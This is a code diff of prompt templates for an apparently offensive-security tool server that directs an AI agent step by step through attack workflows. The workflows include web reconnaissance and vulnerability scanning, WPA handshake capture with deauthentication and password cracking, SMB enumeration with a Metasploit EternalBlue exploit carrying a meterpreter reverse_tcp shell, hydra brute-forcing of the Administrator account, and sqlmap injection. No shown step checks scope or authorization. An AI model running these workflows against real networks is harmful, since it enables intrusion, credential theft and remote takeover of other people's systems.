@@ -52,17 +52,19 @@ async def bug_bounty_recon(target: str) -> PromptResult:
     msgs = [
         Message(
             f"You are running a full bug bounty reconnaissance workflow on target: {target}. "
-            "Execute each step in order using run_security_tool(). "
-            "Each step has expected_time, priority, fallback, and result_context. "
-            "Use the result_context to decide whether to continue or adapt."
+            "Use Pulse tools throughout this workflow — run_security_tool() is the fallback.\n"
+            "QUICK PATH: scan(target, intensity='full') runs nmap+whatweb+nuclei+nikto+gobuster in one call, "
+            "then get_surface() for ports, get_findings() for vulns, get_plan() for attack chain.\n"
+            "Pulse workflow: pulse_guide() → scan() → get_surface() → get_findings() → get_plan().\n"
+            "For specialized tools (wafw00f, subfinder, rustscan, katana), use call_tool() via search_tools()."
         ),
         Message(
             f"STEP 1 [priority: critical] [expected: 30-60s] — WAF detection and tech stack fingerprint\n"
             f"* Run first to avoid blocks. If wafw00f fails, httpx still detects tech.\n\n"
-            f"run_security_tool(tool_name=\"wafw00f\", parameters='{{\"url\": \"{target_url}\"}}')\n"
+            f"call_tool(tool_name=\"wafw00f\", arguments='{{\"url\": \"{target_url}\"}}')\n"
             f"→ If wafw00f fails (no WAF detected): still safe to proceed — no WAF means fewer blocks\n"
             f"→ If wafw00f finds a WAF ({target} is behind Cloudflare/Cloudfront/etc.): note the provider and still proceed — some probes may be blocked\n\n"
-            f"run_security_tool(tool_name=\"httpx\", parameters='{{\"target\": \"{target}\", \"probe\": true, \"tech_detect\": true, \"title\": true, \"status_code\": true}}')\n"
+            f"call_tool(tool_name=\"httpx\", arguments='{{\"target\": \"{target}\", \"probe\": true, \"tech_detect\": true, \"title\": true, \"status_code\": true}}')\n"
             f"→ httpx result_context: check tech stack (Apache/Nginx/Express), HTTP title, status code\n"
             f"→ If httpx fails: skip WAF phase entirely, proceed to Step 2\n"
             f"→ Fallback if both fail: target may be non-HTTP or heavily firewalled — proceed to Step 3 for port scan",
@@ -71,9 +73,9 @@ async def bug_bounty_recon(target: str) -> PromptResult:
         Message(
             f"STEP 2 [priority: medium] [expected: 2-5 min] — Subdomain enumeration (passive, no noise)\n"
             f"* Run in background — results enrich later steps but don't block progress.\n\n"
-            f"run_security_tool(tool_name=\"subfinder\", parameters='{{\"domain\": \"{target}\", \"silent\": true}}')\n"
+            f"call_tool(tool_name=\"subfinder\", arguments='{{\"domain\": \"{target}\", \"silent\": true}}')\n"
             f"→ If subfinder fails: domain may have no public subdomains — try amass, or skip to Step 3\n\n"
-            f"run_security_tool(tool_name=\"amass\", parameters='{{\"domain\": \"{target}\", \"mode\": \"enum\"}}')\n"
+            f"call_tool(tool_name=\"amass\", arguments='{{\"domain\": \"{target}\", \"mode\": \"enum\"}}')\n"
             f"→ If amass fails: target may be a single-domain setup — this is common for APIs\n"
             f"→ result_context: add discovered subdomains to the target list for later steps\n"
             f"→ Fallback if both fail: proceed with {target} only — subdomain discovery can be retried later",
@@ -82,9 +84,13 @@ async def bug_bounty_recon(target: str) -> PromptResult:
         Message(
             f"STEP 3 [priority: critical] [expected: 2-5 min] — Port discovery and service detection\n"
             f"* Without port discovery, web/content scans are blind. This step is mandatory.\n\n"
-            f"run_security_tool(tool_name=\"rustscan\", parameters='{{\"target\": \"{target}\", \"ports\": \"1-65535\"}}')\n"
+            f"PULSE PATH: scan(target='{target}', intensity='quick') — runs nmap+whatweb, returns surface data\n"
+            f"→ Then get_surface() to see structured port/service/tech results\n"
+            f"→ Then get_findings() for vulnerability analysis (requires medium/full scan)\n\n"
+            f"ALTERNATIVE — individual tools if scan() is unavailable:\n"
+            f"call_tool(tool_name=\"rustscan\", arguments='{{\"target\": \"{target}\", \"ports\": \"1-65535\"}}')\n"
             f"→ If rustscan fails: fall back to nmap with a focused port range (1-10000)\n\n"
-            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"additional_args\": \"-sV -sC -T4\"}}')\n"
+            f"call_tool(tool_name=\"nmap\", arguments='{{\"target\": \"{target}\", \"additional_args\": \"-sV -sC -T4\"}}')\n"
             f"→ result_context: check open ports — if 80/443/8080 found → prioritize Step 4-5\n"
             f"→ If nmap fails: target may be firewalled or offline — try scan_background() with longer timeout\n"
             f"→ Fallback: if both port scanners fail, the target is heavily filtered — skip to Step 5 (nuclei can still probe HTTP on default ports)",
@@ -93,9 +99,11 @@ async def bug_bounty_recon(target: str) -> PromptResult:
         Message(
             f"STEP 4 [priority: high] [expected: 3-10 min] — Web content discovery (post-WAF fingerprint)\n"
             f"* Only valuable if HTTP ports were found in Step 3. If no web ports, skip to Step 5.\n\n"
-            f"run_security_tool(tool_name=\"katana\", parameters='{{\"url\": \"{target_url}\"}}')\n"
+            f"PULSE PATH: scan(target='{target}', intensity='full') — includes gobuster for directory busting\n\n"
+            f"ALTERNATIVE — individual tools:\n"
+            f"call_tool(tool_name=\"katana\", arguments='{{\"url\": \"{target_url}\"}}')\n"
             f"→ If katana fails: target may block automated crawling — use gobuster instead\n\n"
-            f"run_security_tool(tool_name=\"gobuster\", parameters='{{\"url\": \"{target_url}\", \"mode\": \"dir\", \"wordlist\": \"/usr/share/wordlists/dirb/common.txt\", \"additional_args\": \"-x php,html,txt\"}}')\n"
+            f"call_tool(tool_name=\"gobuster\", arguments='{{\"url\": \"{target_url}\", \"mode\": \"dir\", \"wordlist\": \"/usr/share/wordlists/dirb/common.txt\", \"additional_args\": \"-x php,html,txt\"}}')\n"
             f"→ result_context: note discovered paths — /api/, /admin/, /.git/ are high-value targets\n"
             f"→ If gobuster finds nothing with common.txt: try with raft-medium-words.txt (SecLists)\n"
             f"→ Fallback: if both web discovery tools fail, the target may be an API with no public paths — proceed to Step 5",
@@ -104,12 +112,15 @@ async def bug_bounty_recon(target: str) -> PromptResult:
         Message(
             f"STEP 5 [priority: high] [expected: 5-15 min] — Vulnerability scan (last — noisiest step)\n"
             f"* Runs automated vulnerability templates. Can generate noise and WAF alerts.\n\n"
-            f"run_security_tool(tool_name=\"nuclei\", parameters='{{\"target\": \"{target_url}\", \"severity\": \"critical,high\"}}')\n"
+            f"PULSE PATH: scan(target='{target}', intensity='medium') — runs nuclei+nikto, then get_findings() for enriched results\n"
+            f"→ get_findings() returns each vuln with exploit suggestion + Layer 2 priority score\n\n"
+            f"ALTERNATIVE — individual tools:\n"
+            f"call_tool(tool_name=\"nuclei\", arguments='{{\"target\": \"{target_url}\", \"severity\": \"critical,high\"}}')\n"
             f"→ result_context: check for critical/high findings — these are exploitation targets\n"
             f"→ If nuclei finds SQLi → next step is sqlmap\n"
             f"→ If nuclei finds XSS → next step is dalfox\n"
             f"→ If nuclei fails (0 matches): may have no known CVEs — still try nikto\n\n"
-            f"run_security_tool(tool_name=\"nikto\", parameters='{{\"target\": \"{target_url}\"}}')\n"
+            f"call_tool(tool_name=\"nikto\", arguments='{{\"target\": \"{target_url}\"}}')\n"
             f"→ result_context: nikto finds info-level issues (paths, headers, config exposure)\n"
             f"→ If nikto times out (>300s): accept partial results — not all nikto checks are relevant\n"
             f"→ Fallback if both fail: target has no known vulnerabilities in public templates — switch to manual testing",
@@ -120,8 +131,9 @@ async def bug_bounty_recon(target: str) -> PromptResult:
             "- Subdomains: count discovered subdomains from Step 2\n"
             "- Open ports: list services and versions from Step 3\n"
             "- Tech stack: web server, framework, language from Step 1\n"
-            "- Vulnerabilities: critical/high findings from Step 5 with suggested exploit tools\n"
+            "- Vulnerabilities: critical/high findings from Step 5 — enriched with exploit suggestions and Layer 2 scores via get_findings()\n"
             "- Attack surface: prioritise exposed admin panels, API endpoints, database ports\n\n"
+            "Pulse NEXT STEPS: get_plan() for attack chain, then follow next_suggested_tool from findings.\n"
             "If critical findings exist, suggest: sqlmap (for SQLi), dalfox (for XSS), metasploit (for RCE).\n"
             "If no critical findings, suggest: continued directory discovery with SecLists wordlists."
         ),
@@ -130,8 +142,8 @@ async def bug_bounty_recon(target: str) -> PromptResult:
         messages=msgs,
         description=f"Bug bounty recon workflow for {target}",
         meta={
-            "version": "0.10.1",
-            "phase": "Phase 3",
+            "version": "0.11.0",
+            "phase": "pulse_workflow",
             "tools_count": 10,
             "estimated_time_min": 15,
         },
@@ -152,13 +164,14 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         Message(
             f"You are running a WiFi WPA/WPA2 attack chain — "
             f"interface: {interface} | BSSID: {bssid} | channel: {channel}. "
-            "Execute each step in order. Each step has expected_time, priority, "
-            "and result_context to guide decisions."
+            "Use Pulse tools throughout: call_tool() replaces run_security_tool() for individual tools. "
+            "Pulse workflow: pulse_guide() for WiFi tools → call_tool() for each step. "
+            "Do NOT use scan() — WiFi tools are not part of the scan pipeline."
         ),
         Message(
             f"STEP 1 [priority: critical] [expected: 10s] — Enable monitor mode\n"
             f"* Required for all subsequent WiFi operations.\n\n"
-            f"run_security_tool(tool_name=\"airmon_ng\", parameters='{{\"interface\": \"{interface}\", \"action\": \"start\"}}')\n"
+            f"call_tool(tool_name=\"airmon_ng\", arguments='{{\"interface\": \"{interface}\", \"action\": \"start\"}}')\n"
             f"→ If success: interface becomes {interface}mon — use this for all later steps\n"
             f"→ If airmon_ng fails: interface may not support monitor mode, or needs rfkill unblock\n"
             f"→ Fallback: try `rfkill unblock wifi` manually, or use a different interface",
@@ -167,7 +180,7 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         Message(
             f"STEP 2 [priority: critical] [expected: 30-120s] — Start targeted capture\n"
             f"* Listens for handshake on the target channel. Keep running until STEP 3 completes.\n\n"
-            f"run_security_tool(tool_name=\"airodump_ng\", parameters='{{\"interface\": \"{interface}mon\", \"bssid\": \"{bssid}\", \"channel\": \"{channel}\", \"output_prefix\": \"/tmp/hexstrike_capture\"}}')\n"
+            f"call_tool(tool_name=\"airodump_ng\", arguments='{{\"interface\": \"{interface}mon\", \"bssid\": \"{bssid}\", \"channel\": \"{channel}\", \"output_prefix\": \"/tmp/hexstrike_capture\"}}')\n"
             f"→ airodump_ng runs continuously — let it run in background while you proceed\n"
             f"→ result_context: check if a WPA handshake is captured (\"WPA handshake: {bssid}\" in output)\n"
             f"→ If handshake already captured: skip STEP 3 (deauth), proceed directly to STEP 4\n"
@@ -181,7 +194,7 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         Message(
             f"STEP 3 [priority: high] [expected: 10-30s] — Force client deauthentication\n"
             f"* Only run this if STEP 2 did NOT capture a handshake. Deauth forces reconnection → captures the 4-way handshake.\n\n"
-            f"run_security_tool(tool_name=\"aireplay_ng\", parameters='{{\"interface\": \"{interface}mon\", \"attack_mode\": 0, \"bssid\": \"{bssid}\", \"count\": 10}}')\n"
+            f"call_tool(tool_name=\"aireplay_ng\", arguments='{{\"interface\": \"{interface}mon\", \"attack_mode\": 0, \"bssid\": \"{bssid}\", \"count\": 10}}')\n"
             f"→ result_context: check that deauth packets are being sent (\"Sent XX packets\" in output)\n"
             f"→ If aireplay_ng fails: no associated clients, or interface not in monitor mode\n"
             f"→ Fallback if no clients respond: target may be idle — retry STEP 2 during business hours",
@@ -190,7 +203,7 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         Message(
             f"STEP 4 [priority: critical] [expected: 1-30 min] — Crack captured handshake\n"
             f"* Only run if a handshake .cap file exists at /tmp/hexstrike_capture-01.cap.\n\n"
-            f"run_security_tool(tool_name=\"aircrack_ng\", parameters='{{\"capture_files\": [\"/tmp/hexstrike_capture-01.cap\"], \"wordlist\": \"/usr/share/wordlists/rockyou.txt\", \"bssid\": \"{bssid}\"}}')\n"
+            f"call_tool(tool_name=\"aircrack_ng\", arguments='{{\"capture_files\": [\"/tmp/hexstrike_capture-01.cap\"], \"wordlist\": \"/usr/share/wordlists/rockyou.txt\", \"bssid\": \"{bssid}\"}}')\n"
             f"→ result_context: check \"KEY FOUND\" vs \"KEY NOT FOUND\" in output\n"
             f"→ If KEY FOUND: PSK displayed in output — report immediately\n"
             f"→ If KEY NOT FOUND: wordlist (rockyou.txt) didn't contain the password\n"
@@ -201,7 +214,7 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         Message(
             f"STEP 5 [priority: medium] [expected: 10s] — Restore managed mode\n"
             f"* Cleanup step — always run to restore network connectivity.\n\n"
-            f"run_security_tool(tool_name=\"airmon_ng\", parameters='{{\"interface\": \"{interface}mon\", \"action\": \"stop\"}}')\n"
+            f"call_tool(tool_name=\"airmon_ng\", arguments='{{\"interface\": \"{interface}mon\", \"action\": \"stop\"}}')\n"
             f"→ If success: interface returns to managed mode, network connectivity restored\n"
             f"→ If airmon_ng stop fails: may leave interface in inconsistent state — reboot may be needed",
             role="assistant",
@@ -218,8 +231,8 @@ async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> P
         messages=msgs,
         description=f"WiFi WPA/WPA2 attack chain for {bssid}",
         meta={
-            "version": "0.10.1",
-            "phase": "Phase 3",
+            "version": "0.11.0",
+            "phase": "pulse_workflow",
             "tools_count": 4,
             "estimated_time_min": 5,
         },
@@ -243,16 +256,20 @@ async def smb_lateral_movement(target: str) -> PromptResult:
     msgs = [
         Message(
             f"You are running an SMB enumeration and lateral movement workflow on target: {target}. "
-            "Execute each step in order. Each step has expected_time, priority, "
-            "and result_context to guide decisions."
+            "Use Pulse tools throughout: call_tool() replaces run_security_tool() for individual tools.\n"
+            "PULSE PATH for port discovery: scan(target='{target}', intensity='quick') → get_surface() for port listing.\n"
+            "Then use call_tool() for SMB-specific tools (nbtscan, enum4linux, smbmap, netexec, hydra, metasploit)."
         ),
         Message(
             f"STEP 1 [priority: critical] [expected: 1-3 min] — NetBIOS discovery and SMB version check\n"
             f"* Determines if target has SMB services exposed.\n\n"
-            f"run_security_tool(tool_name=\"nbtscan\", parameters='{{\"target\": \"{target}\"}}')\n"
+            f"PULSE PATH: scan(target='{target}', intensity='quick') — detects port 445/139 via nmap\n"
+            f"→ Then get_surface() to see open ports and services\n\n"
+            f"ALTERNATIVE — individual tools:\n"
+            f"call_tool(tool_name=\"nbtscan\", arguments='{{\"target\": \"{target}\"}}')\n"
             f"→ result_context: check for NetBIOS name table — reveals hostname, domain, logged-in users\n"
             f"→ If nbtscan fails: target may not run NetBIOS — still proceed with nmap\n\n"
-            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"ports\": \"445,139\", \"additional_args\": \"-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode\"}}')\n"
+            f"call_tool(tool_name=\"nmap\", arguments='{{\"target\": \"{target}\", \"ports\": \"445,139\", \"additional_args\": \"-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode\"}}')\n"
             f"→ result_context: check SMB version (SMB1 vs SMB2/3), security mode, and vulnerability scripts\n"
             f"→ If nmap script finds MS17-010: EternalBlue exploitable → prioritize STEP 3-4\n"
             f"→ If nmap shows SMB signing disabled: relay attacks possible → note for later\n"
@@ -262,11 +279,11 @@ async def smb_lateral_movement(target: str) -> PromptResult:
         Message(
             f"STEP 2 [priority: high] [expected: 2-5 min] — Null session enumeration\n"
             f"* Tries unauthenticated access to SMB shares and user enumeration.\n\n"
-            f"run_security_tool(tool_name=\"enum4linux\", parameters='{{\"target\": \"{target}\", \"additional_args\": \"-a\"}}')\n"
+            f"call_tool(tool_name=\"enum4linux\", arguments='{{\"target\": \"{target}\", \"additional_args\": \"-a\"}}')\n"
             f"→ result_context: check for share listings, user lists, password policy\n"
             f"→ If enum4linux finds shares without auth: misconfigured SMB — high-value target\n"
             f"→ If enum4linux fails or returns empty: null sessions may be disabled (modern Windows default)\n\n"
-            f"run_security_tool(tool_name=\"smbmap\", parameters='{{\"target\": \"{target}\"}}')\n"
+            f"call_tool(tool_name=\"smbmap\", arguments='{{\"target\": \"{target}\"}}')\n"
             f"→ result_context: check accessible shares and their permissions (READ/WRITE)\n"
             f"→ If smbmap finds writable shares: potential for file upload attacks (e.g., SCF, shortcut hijack)\n"
             f"→ If both enum4linux and smbmap return nothing: SMB is locked down — skip to STEP 3 for vulnerability check",
@@ -275,11 +292,11 @@ async def smb_lateral_movement(target: str) -> PromptResult:
         Message(
             f"STEP 3 [priority: critical] [expected: 30-60s] — EternalBlue check + credential testing\n"
             f"* Decision point: if MS17-010 confirmed, proceed to exploitation. If not, pivot to credential attacks.\n\n"
-            f"run_security_tool(tool_name=\"nmap\", parameters='{{\"target\": \"{target}\", \"ports\": \"445\", \"additional_args\": \"--script smb-vuln-ms17-010\"}}')\n"
+            f"call_tool(tool_name=\"nmap\", arguments='{{\"target\": \"{target}\", \"ports\": \"445\", \"additional_args\": \"--script smb-vuln-ms17-010\"}}')\n"
             f"→ result_context: check \"VULNERABLE\" vs \"NOT VULNERABLE\" in script output\n"
             f"→ IF VULNERABLE: proceed to STEP 4 (EternalBlue exploitation) — this is the priority path\n"
             f"→ IF NOT VULNERABLE: SMB is patched against EternalBlue — proceed to STEP 4 alternative (credential brute-force)\n\n"
-            f"run_security_tool(tool_name=\"netexec\", parameters='{{\"target\": \"{target}\", \"protocol\": \"smb\"}}')\n"
+            f"call_tool(tool_name=\"netexec\", arguments='{{\"target\": \"{target}\", \"protocol\": \"smb\"}}')\n"
             f"→ result_context: check SMB signing status, SMB version, available shares\n"
             f"→ If netexec reveals SMB signing disabled: relay attack is viable\n"
             f"→ Fallback: if both nmap and netexec fail, target may be filtering SMB probes — try with different source port",
@@ -295,11 +312,11 @@ async def smb_lateral_movement(target: str) -> PromptResult:
             f"* Path B: Credential brute-force (if SMB is patched but has open shares).\n"
             f"* Choose PATH A or PATH B based on STEP 3 result_context.\n\n"
             f"PATH A — EternalBlue exploitation:\n"
-            f"run_security_tool(tool_name=\"metasploit\", parameters='{{\"module\": \"exploit/windows/smb/ms17_010_eternalblue\", \"options\": {{\"RHOSTS\": \"{target}\", \"PAYLOAD\": \"windows/x64/meterpreter/reverse_tcp\"}}}}')\n"
+            f"call_tool(tool_name=\"metasploit\", arguments='{{\"module\": \"exploit/windows/smb/ms17_010_eternalblue\", \"options\": {{\"RHOSTS\": \"{target}\", \"PAYLOAD\": \"windows/x64/meterpreter/reverse_tcp\"}}}}')\n"
             f"→ If metasploit succeeds: meterpreter session opened → post-exploitation (hashdump, screenshots)\n"
             f"→ If metasploit fails: target may be patched despite nmap flag, or architecture mismatch (x86 vs x64)\n\n"
             f"PATH B — Credential brute-force (if EternalBlue not viable):\n"
-            f"run_security_tool(tool_name=\"hydra\", parameters='{{\"target\": \"{target}\", \"protocol\": \"smb\", \"username\": \"Administrator\", \"wordlist\": \"/usr/share/wordlists/rockyou.txt\"}}')\n"
+            f"call_tool(tool_name=\"hydra\", arguments='{{\"target\": \"{target}\", \"protocol\": \"smb\", \"username\": \"Administrator\", \"wordlist\": \"/usr/share/wordlists/rockyou.txt\"}}')\n"
             f"→ result_context: check for valid credentials in hydra output\n"
             f"→ If hydra finds creds: use netexec or smbmap to access shares and enumerate\n"
             f"→ If hydra finds nothing: try with common usernames (admin, guest, vagrant) or domain users from STEP 2\n\n"
@@ -321,8 +338,8 @@ async def smb_lateral_movement(target: str) -> PromptResult:
         messages=msgs,
         description=f"SMB enumeration and lateral movement for {target}",
         meta={
-            "version": "0.10.1",
-            "phase": "Phase 3",
+            "version": "0.11.0",
+            "phase": "pulse_workflow",
             "tools_count": 6,
             "estimated_time_min": 15,
         },
@@ -349,13 +366,14 @@ async def cloud_security_audit(
     msgs = [
         Message(
             f"You are running a cloud security audit — provider: {provider} | profile: {profile} | image: {image}. "
-            "Execute each step in order. Each step has expected_time, priority, "
-            "and result_context to guide decisions."
+            "Use Pulse tools: call_tool() replaces run_security_tool() for individual tools. "
+            "Pulse workflow: pulse_guide() → call_tool() for each cloud tool. "
+            "Do NOT use scan() — cloud tools (prowler, trivy, kube_hunter) are not in the scan pipeline."
         ),
         Message(
             f"STEP 1 [priority: critical] [expected: 30-60 min] — Cloud configuration and compliance audit\n"
             f"* Longest step — prowler runs 200+ checks across IAM, S3, EC2, RDS, Lambda, CloudTrail.\n\n"
-            f"run_security_tool(tool_name=\"prowler\", parameters='{{\"provider\": \"{provider}\", \"profile\": \"{profile}\"}}')\n"
+            f"call_tool(tool_name=\"prowler\", arguments='{{\"provider\": \"{provider}\", \"profile\": \"{profile}\"}}')\n"
             f"→ result_context: prowler output is grouped by service (iam, s3, ec2, etc.) and severity (CRITICAL, HIGH, MEDIUM, LOW)\n"
             f"→ Check for CRITICAL findings first: public S3 buckets, IAM keys exposed, MFA disabled\n"
             f"→ If prowler fails with credential error: AWS credentials not configured for profile '{profile}'\n"
@@ -366,7 +384,7 @@ async def cloud_security_audit(
         Message(
             f"STEP 2 [priority: high] [expected: 2-10 min] — Container image vulnerability scan (target: {image})\n"
             f"* Scans the container image for known CVEs using advisory databases.\n\n"
-            f"run_security_tool(tool_name=\"trivy\", parameters='{{\"target\": \"{image}\", \"scan_type\": \"image\", \"severity\": \"HIGH,CRITICAL\"}}')\n"
+            f"call_tool(tool_name=\"trivy\", arguments='{{\"target\": \"{image}\", \"scan_type\": \"image\", \"severity\": \"HIGH,CRITICAL\"}}')\n"
             f"→ result_context: check for CRITICAL CVEs with known exploits — these are actionable\n"
             f"→ If trivy finds CRITICAL CVEs: note CVE IDs, affected packages, and fix versions\n"
             f"→ If trivy fails: image may not exist locally — try pulling with `docker pull {image}` first\n"
@@ -378,7 +396,7 @@ async def cloud_security_audit(
             f"STEP 3 [priority: medium] [expected: 5-20 min] — Kubernetes cluster assessment"
             + (f" (API: {k8s_api_ip}):\n\n"
                f"* Scans the K8s cluster for misconfigurations, known vulnerabilities, and RBAC issues.\n\n"
-               f"run_security_tool(tool_name=\"kube_hunter\", parameters='{{\"additional_args\": \"--remote {k8s_api_ip}\"}}')\n"
+               f"call_tool(tool_name=\"kube_hunter\", arguments='{{\"additional_args\": \"--remote {k8s_api_ip}\"}}')\n"
                f"→ result_context: check for CRITICAL findings (e.g., anonymous auth enabled, exposed dashboard)\n"
                f"→ If kube_hunter finds open etcd port (2379): full cluster compromise possible — report immediately\n"
                f"→ If kube_hunter hangs or times out: API endpoint may be firewalled or authenticated\n"
@@ -404,8 +422,8 @@ async def cloud_security_audit(
         messages=msgs,
         description=f"Cloud security audit for {provider}",
         meta={
-            "version": "0.10.1",
-            "phase": "Phase 3",
+            "version": "0.11.0",
+            "phase": "pulse_workflow",
             "tools_count": 3,
             "estimated_time_min": 60,
         },
@@ -467,31 +485,42 @@ async def ctf_web_challenge(url: str) -> list[Message]:
             f"CTFWorkflowManager tools: {', '.join(suggested_tools[:8])}"
             f"{strategy_summary}"
             f"{fallback_summary}\n"
-            "Execute each step using run_security_tool()."
+            "Use Pulse tools: call_tool() replaces run_security_tool() for individual tools.\n"
+            "PULSE CTF PATH: ctf_analyze() → scan(target) → get_findings() → ctf_solve().\n"
+            "For individual tool access: search_tools('nmap whatweb') to discover tools, then call_tool()."
         ),
         Message(
             f"STEP 1 — {step_label(0) or 'Reconnaissance: tech detection and WAF check'}\n"
-            f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "{url}"}}\')\n'
-            f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')\n'
-            f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "{url}"}}\')',
+            f'PULSE PATH: scan(target="{url}", intensity="quick") for nmap+whatweb\n'
+            f'→ Then get_findings() for vulnerability analysis (requires medium/full scan)\n\n'
+            f'ALTERNATIVE — individual tools:\n'
+            f'call_tool(tool_name="wafw00f", arguments=\'{{"url": "{url}"}}\')\n'
+            f'call_tool(tool_name="httpx", arguments=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')\n'
+            f'call_tool(tool_name="nikto", arguments=\'{{"target": "{url}"}}\')',
             role="assistant",
         ),
         Message(
             f"STEP 2 — {step_label(2) or 'Directory enumeration: multi-tool discovery'}\n"
-            f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')\n'
-            f'run_security_tool(tool_name="ffuf", parameters=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')\n'
-            f'run_security_tool(tool_name="katana", parameters=\'{{"url": "{url}"}}\')',
+            f'PULSE PATH: scan(target="{url}", intensity="full") — includes gobuster for directory busting\n\n'
+            f'ALTERNATIVE — individual tools:\n'
+            f'call_tool(tool_name="gobuster", arguments=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')\n'
+            f'call_tool(tool_name="ffuf", arguments=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')\n'
+            f'call_tool(tool_name="katana", arguments=\'{{"url": "{url}"}}\')',
             role="assistant",
         ),
         Message(
             f"STEP 3 — {step_label(4) or 'Vulnerability scanning: automated scan + injection testing'}\n"
-            f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "{url}"}}\')\n'
-            f'run_security_tool(tool_name="sqlmap", parameters=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')\n'
-            f'run_security_tool(tool_name="dalfox", parameters=\'{{"url": "{url}"}}\')',
+            f'PULSE PATH: scan(target="{url}", intensity="medium") — runs nuclei+nikto\n'
+            f'→ get_findings() returns enriched results with exploit suggestions + Layer 2 scores\n\n'
+            f'ALTERNATIVE — individual tools:\n'
+            f'call_tool(tool_name="nuclei", arguments=\'{{"target": "{url}"}}\')\n'
+            f'call_tool(tool_name="sqlmap", arguments=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')\n'
+            f'call_tool(tool_name="dalfox", arguments=\'{{"url": "{url}"}}\')',
             role="assistant",
         ),
         Message(
             f"STEP 4 — {step_label(5) or 'Manual exploitation'}\n"
+            f"PULSE PATH: get_plan() for attack chain, then follow next_suggested_tool.\n"
             "If automation found nothing: apply fallback strategies above.\n"
             "Parameter tampering, cookie/session manipulation, business logic flaws."
         ),
@@ -601,6 +630,16 @@ async def ctf_challenge(
         ),
     ]
 
+    # Pulse preamble as first step
+    pulse_preamble = Message(
+        "PULSE WORKFLOW: Use Pulse tools for this CTF challenge.\n"
+        "- ctf_analyze() → scan(target) → get_findings() → ctf_solve() — full Pulse CTF chain\n"
+        "- call_tool() replaces run_security_tool() for individual tool access\n"
+        "- For category-specific tools: search_tools('<category>') to discover, then call_tool()\n"
+        "- Pulse tools return structured data: findings include exploit suggestions + Layer 2 scores"
+    )
+    messages.append(pulse_preamble)
+
     for step in steps[:6]:
         step_tools = step.get("tools", [])
         is_parallel = step.get("parallel", False)
@@ -610,8 +649,8 @@ async def ctf_challenge(
         for tool in step_tools[:3]:
             if tool not in ("manual", "custom", "python", "sage"):
                 step_calls.append(
-                    f'run_security_tool(tool_name="{tool}", '
-                    f'parameters=\'{{"target": "{target or name}"}}\')'
+                    f'call_tool(tool_name="{tool}", '
+                    f'arguments=\'{{"target": "{target or name}"}}\')'
                 )
             else:
                 step_calls.append(f"# {step['description']}")
